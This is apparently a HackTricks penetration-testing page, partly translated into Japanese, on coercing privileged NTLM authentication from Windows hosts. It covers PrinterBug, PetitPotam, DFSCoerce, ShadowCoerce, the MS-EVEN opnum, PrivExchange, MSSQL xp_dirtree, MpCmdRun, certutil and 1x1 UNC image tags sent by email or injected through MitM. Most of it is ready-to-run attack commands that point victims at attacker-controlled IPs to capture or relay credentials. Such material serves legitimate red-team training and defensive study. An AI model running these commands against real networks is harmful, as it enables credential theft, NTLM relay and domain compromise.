# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、サードパーティの依存を避けるために MIDL コンパイラを使用して C# で実装された、**リモート認証トリガー**の**コレクション**です。

## Spooler Service Abuse

If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
注意：プリンターが任意のシステムに通知を送る場合、そのシステムに対して**認証**する必要があります。したがって、攻撃者は _**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、サービスはその認証で**コンピュータアカウントを使用**します。

### Finding Windows Servers on the domain

Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler サービスがリッスンしているかの検出

少し修正した @mysmartlogin の (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) を使用して、Spooler Service がリッスンしているか確認します：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux上でrpcdump.pyを使ってMS-RPRN Protocolを確認することもできます。
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### サービスに任意のホストへの認証を要求する

ここから [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket) をコンパイルできます。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linux を使用している場合は [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) または [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) を使用してください
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegation と組み合わせた場合

If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).

## RPC の強制認証

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion マトリックス（アウトバウンド認証をトリガーする interfaces/opnums）
- MS-RPRN (Print System Remote Protocol)
- パイプ: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- ツール: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- パイプ: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- パイプ: \\PIPE\\efsrpc (\\PIPE\\lsarpc、\\PIPE\\samr、\\PIPE\\lsass、\\PIPE\\netlogon 経由でも)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- ツール: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- パイプ: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- ツール: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- パイプ: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- ツール: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- パイプ: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- ツール: CheeseOunce

Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.

### MS-EVEN: ElfrOpenBELW (opnum 9) の強制
- インターフェイス: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- 呼び出しシグネチャ: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- 効果: 対象は指定されたバックアップログパスを開こうとし、攻撃者が管理する UNC に対して認証します。
- 実用例: Tier 0 資産 (DC/RODC/Citrix/etc.) を強制して NetNTLM を送出させ、それを AD CS エンドポイント (ESC8/ESC11 シナリオ) や他の特権サービスにリレーする。

## PrivExchange

The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.

By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.

## Windows 内部

If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
別の手法としてこちらを使う: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin (Microsoft-signed binary) を使って NTLM 認証を強制することが可能です:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### メール経由

もしあなたが侵害したいマシンにログインするユーザーの**email address**を知っているなら、次のような**email with a 1x1 image**を送るだけで済みます
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
対象がそれを開くと、認証を試みます。

### MitM

もしコンピュータに対してMitM攻撃を行い、対象が閲覧するページにHTMLを注入できるなら、ページに次のような画像を注入してみてください：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM 認証を強制・フィッシングする他の方法


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 のクラック

もし [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack) をキャプチャできるなら。\
_NTLMv1 をクラックするには Responder challenge を "1122334455667788" に設定する必要があることを覚えておいてください_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
